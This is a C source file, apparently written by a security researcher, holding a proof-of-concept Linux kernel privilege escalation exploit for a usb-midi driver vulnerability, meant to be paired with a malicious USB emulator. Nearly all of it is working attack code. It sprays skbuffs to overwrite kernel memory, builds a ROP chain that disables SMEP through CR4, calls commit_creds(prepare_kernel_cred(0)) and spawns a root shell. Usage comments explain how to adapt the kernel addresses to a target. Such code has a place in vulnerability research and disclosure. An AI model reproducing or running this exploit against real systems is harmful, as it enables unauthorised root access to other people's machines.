// A part of the proof-of-concept exploit for the vulnerability in the usb-midi
// driver. Meant to be used in conjuction with a hardware usb emulator, which
// emulates a particular malicious usb device (a Facedancer21 for example).
//
// Andrey Konovalov <andreyknvl@gmail.com>
//
// Usage:
//    // Edit source to set addresses of the kernel symbols and the ROP gadgets.
//    $ gcc poc.c -masm=intel
//    // Run N instances of the binary with the argument increasing from 0 to N,
//    // where N is the number of cpus on your machine.
//    $ ./a.out 0 & ./a.out 1 & ...
//    [+] starting as: uid=1000, euid=1000
//    [+] payload addr: 0x400b60
//    [+] fake stack mmaped
//    [+] plug in the usb device...
//    // Now plug in the device a few times.
//    // In one of the instances you will get (if the kernel doesn't crash):
//    [+] got r00t: uid=0, euid=0
//    # id
//    uid=0(root) gid=0(root) groups=0(root)

#define _GNU_SOURCE

#include <netinet/ip.h>

#include <assert.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/mman.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/syscall.h>

#include <arpa/inet.h>

// You need to set these based on your kernel.
// To easiest way to obtain the addresses of commit_creds and prepare_kernel_cred
// is to boot your kernel and grep /proc/kallsyms for them.
// The easiest way to obtain the gadgets addresses is to use the ROPgadget util.
// Note that all of the used gadgets must preserve the initial value of the rbp
// register, since this value is used later on to restore rsp.
// The value of CR4_DESIRED_VALUE must have the SMEP bit disabled.

#define COMMIT_CREDS              0xffffffff810957e0L
#define PREPARE_KERNEL_CRED       0xffffffff81095ae0L

#define XCHG_EAX_ESP_RET          0xffffffff8100008aL

#define POP_RDI_RET               0xffffffff8118991dL
#define MOV_DWORD_PTR_RDI_EAX_RET 0xffffffff810fff17L
#define MOV_CR4_RDI_RET           0xffffffff8105b8f0L
#define POP_RCX_RET               0xffffffff810053bcL
#define JMP_RCX                   0xffffffff81040a90L

#define CR4_DESIRED_VALUE         0x407f0

// Payload. Saves eax, which holds the 32 lower bits of the old esp value,
// disables SMEP, restores rsp, obtains root, jumps back to the caller.

#define CHAIN_SAVE_EAX                  \
  *stack++ = POP_RDI_RET;               \
  *stack++ = (uint64_t)&saved_eax;      \
  *stack++ = MOV_DWORD_PTR_RDI_EAX_RET;

#define CHAIN_SET_CR4                   \
  *stack++ = POP_RDI_RET;               \
  *stack++ = CR4_DESIRED_VALUE;         \
  *stack++ = MOV_CR4_RDI_RET;           \

#define CHAIN_JMP_PAYLOAD               \
  *stack++ = POP_RCX_RET;               \
  *stack++ = (uint64_t)&payload;        \
  *stack++ = JMP_RCX;                   \

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;

void get_root(void) {
  commit_creds(prepare_kernel_cred(0));
}

uint64_t saved_eax;

// Unfortunately GCC does not support `__atribute__((naked))` on x86, which
// can be used to omit a function's prologue, so I had to use this weird
// wrapper hack as a workaround. Note: Clang does support it, which means it
// has better support of GCC attributes than GCC itself. Funny.
void wrapper() {
  asm volatile ("                         \n\
    payload:                              \n\
      movq %%rbp, %%rax                   \n\
      movq $0xffffffff00000000, %%rdx     \n\
      andq %%rdx, %%rax                   \n\
      movq %0, %%rdx                      \n\
      addq %%rdx, %%rax                   \n\
      movq %%rax, %%rsp                   \n\
      jmp get_root                        \n\
  " : : "m"(saved_eax) : );
}

void payload();

// Kernel structs.

struct ubuf_info {
  uint64_t callback;        // void (*callback)(struct ubuf_info *, bool)
  uint64_t ctx;             // void *
  uint64_t desc;            // unsigned long
};

struct skb_shared_info {
  uint8_t  nr_frags;        // unsigned char
  uint8_t  tx_flags;        // __u8
  uint16_t gso_size;        // unsigned short
  uint16_t gso_segs;        // unsigned short
  uint16_t gso_type;        // unsigned short
  uint64_t frag_list;       // struct sk_buff *
  uint64_t hwtstamps;       // struct skb_shared_hwtstamps
  uint32_t tskey;           // u32
  uint32_t ip6_frag_id;     // __be32
  uint32_t dataref;         // atomic_t
  uint64_t destructor_arg;  // void *
  uint8_t  frags[16][17];   // skb_frag_t frags[MAX_SKB_FRAGS];
};

#define MIDI_MAX_ENDPOINTS 2

struct snd_usb_midi {
  uint8_t bullshit[240];

  struct snd_usb_midi_endpoint {
    uint64_t out;           // struct snd_usb_midi_out_endpoint *
    uint64_t in;            // struct snd_usb_midi_in_endpoint *
  } endpoints[MIDI_MAX_ENDPOINTS];

  // More bullshit.
};

// Init buffer for overwriting a skbuff object.

struct ubuf_info ui;

void init_buffer(char* buffer) {
  struct skb_shared_info *ssi = (struct skb_shared_info *)&buffer[192];
  struct snd_usb_midi *midi = (struct snd_usb_midi *)&buffer[0];
  int i;

  ssi->tx_flags = 0xff;
  ssi->destructor_arg = (uint64_t)&ui;
  ui.callback = XCHG_EAX_ESP_RET;

  // Prevents some crashes.
  ssi->nr_frags = 0;

  // Prevents some crashes.
  ssi->frag_list = 0;

  // Prevents some crashes.
  for (i = 0; i < MIDI_MAX_ENDPOINTS; i++) {
    midi->endpoints[i].out = 0;
    midi->endpoints[i].in = 0;
  }
}

// Map a fake stack where the ROP payload resides.

void mmap_stack() {
  uint64_t stack_addr;
  int stack_offset;
  uint64_t* stack;
  int page_size;

  page_size = getpagesize();

  stack_addr = (XCHG_EAX_ESP_RET & 0x00000000ffffffffL) & ~(page_size - 1);
  stack_offset = XCHG_EAX_ESP_RET % page_size;

  stack = mmap((void *)stack_addr, page_size, PROT_READ | PROT_WRITE,
      MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
  if (stack == MAP_FAILED) {
    perror("[-] mmap()");
    exit(EXIT_FAILURE);
  }

  stack = (uint64_t *)((char *)stack + stack_offset);

  CHAIN_SAVE_EAX;
  CHAIN_SET_CR4;
  CHAIN_JMP_PAYLOAD;
}

// Sending control messages.

int socket_open(int port) {
  int sock;
  struct sockaddr_in sa;

  sock = socket(AF_INET, SOCK_DGRAM, 0);
  if (sock == -1) {
    perror("[-] socket()");
    exit(EXIT_FAILURE);
  }

  sa.sin_family = AF_INET;
  sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  sa.sin_port = htons(port);
  if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) == -1) {
    perror("[-] connect()");
    exit(EXIT_FAILURE);
  }

  return sock;
}

void socket_close(int sock) {
  close(sock);
}

void socket_sendmmsg(int sock) {
  struct mmsghdr msg[1];
  struct iovec msg2;
  int rv;
  char buffer[512];

  memset(&msg2, 0, sizeof(msg2));
  msg2.iov_base = &buffer[0];
  msg2.iov_len = 512;

  memset(msg, 0, sizeof(msg));
  msg[0].msg_hdr.msg_iov = &msg2;
  msg[0].msg_hdr.msg_iovlen = 1;

  memset(&buffer[0], 0xa1, 512);

  struct cmsghdr *hdr = (struct cmsghdr *)&buffer[0];
  hdr->cmsg_len = 512;
  hdr->cmsg_level = SOL_IP + 1;

  init_buffer(&buffer[0]);

  msg[0].msg_hdr.msg_control = &buffer[0];
  msg[0].msg_hdr.msg_controllen = 512;

  rv = syscall(__NR_sendmmsg, sock, msg, 1, 0);
  if (rv == -1) {
    perror("[-] sendmmsg()");
    exit(EXIT_FAILURE);
  }
}

// Allocating and freeing skbuffs.

struct sockaddr_in server_si_self;

struct sockaddr_in client_si_other;

int init_server(int port) {
  int sock;
  int rv;

  sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
  if (sock == -1) {
    perror("[-] socket()");
    exit(EXIT_FAILURE);
  }

  memset(&server_si_self, 0, sizeof(server_si_self));
  server_si_self.sin_family = AF_INET;
  server_si_self.sin_port = htons(port);
  server_si_self.sin_addr.s_addr = htonl(INADDR_ANY);

  rv = bind(sock, (struct sockaddr *)&server_si_self,
      sizeof(server_si_self));
  if (rv == -1) {
    perror("[-] bind()");
    exit(EXIT_FAILURE);
  }

  return sock;
}

int init_client(int port) {
  int sock;
  int rv;

  sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
  if (sock == -1) {
    perror("[-] socket()");
    exit(EXIT_FAILURE);
  }

  memset(&client_si_other, 0, sizeof(client_si_other));
  client_si_other.sin_family = AF_INET;
  client_si_other.sin_port = htons(port);

  rv = inet_aton("127.0.0.1", &client_si_other.sin_addr);
  if (rv == 0) {
    perror("[-] inet_aton()");
    exit(EXIT_FAILURE);
  }

  return sock;
}

void client_send_message(int sock) {
  int rv;
  // Messages of 128 bytes result in 512 bytes skbuffs.
  char sent_message[128] = { 0x10 };

  rv = sendto(sock, &sent_message[0], 128, 0,
    (struct sockaddr *)&client_si_other,
    sizeof(client_si_other));
  if (rv == -1) {
    perror("[-] sendto()");
    exit(EXIT_FAILURE);
  }
}

void destroy_server(int sock) {
  close(sock);
}

void destroy_client(int sock) {
  close(sock);
}

// Checking root.

void exec_shell() {
  char *args[] = {"/bin/sh", "-i", NULL};
  execve("/bin/sh", args, NULL);
}

void fork_shell() {
  pid_t rv;

  rv = fork();
  if (rv == -1) {
    perror("[-] fork()");
    exit(EXIT_FAILURE);
  }

  if (rv == 0) {
    exec_shell();
  }

  while (true) {
    sleep(1);
  }
}

bool is_root() {
  return getuid() == 0;
}

void check_root() {
  if (!is_root())
    return;

  printf("[+] got r00t: uid=%d, euid=%d\n", getuid(), geteuid());

  // Fork and exec instead of just doing the exec to avoid freeing skbuffs
  // and prevent some crashes due to a allocator corruption.
  fork_shell();
}

// Main.

#define PORT_BASE_1 4100
#define PORT_BASE_2 4200
#define PORT_BASE_3 4300

#define SKBUFFS_NUM 64
#define MMSGS_NUM 256

int server_sock;
int client_sock;

void step_begin(int id) {
  int i;

  server_sock = init_server(PORT_BASE_2 + id);
  client_sock = init_client(PORT_BASE_2 + id);

  for (i = 0; i < SKBUFFS_NUM; i++) {
    client_send_message(client_sock);
  }

  for (i = 0; i < MMSGS_NUM; i++) {
    int sock = socket_open(PORT_BASE_3 + id);
    socket_sendmmsg(sock);
    socket_close(sock);
  }
}

void step_end(int id) {
  destroy_server(server_sock);
  destroy_client(client_sock);
}

void body(int id) {
  int server_sock, client_sock, i;

  server_sock = init_server(PORT_BASE_1 + id);
  client_sock = init_client(PORT_BASE_1 + id);

  for (i = 0; i < 512; i++)
    client_send_message(client_sock);

  while (true) {
    step_begin(id);
    check_root();
    step_end(id);
  }
}

bool parse_int(const char *input, int *output) {
  char* wrong_token = NULL;
  int result = strtol(input, &wrong_token, 10);
  if (*wrong_token != '\0') {
    return false;
  }
  *output = result;
  return true;
}

int main(int argc, char **argv) {
  bool rv;
  int id;

  if (argc != 2) {
    printf("Usage: %s <instance_id>\n", argv[0]);
    return EXIT_SUCCESS;
  }

  rv = parse_int(argv[1], &id);
  if (!rv) {
    printf("Usage: %s <instance_id>\n", argv[0]);
    return EXIT_SUCCESS;
  }

  printf("[+] starting as: uid=%d, euid=%d\n", getuid(), geteuid());

  printf("[+] payload addr: %p\n", &payload);

  mmap_stack();
  printf("[+] fake stack mmaped\n");

  printf("[+] plug in the usb device...\n");

  body(id);

  return EXIT_SUCCESS;
}
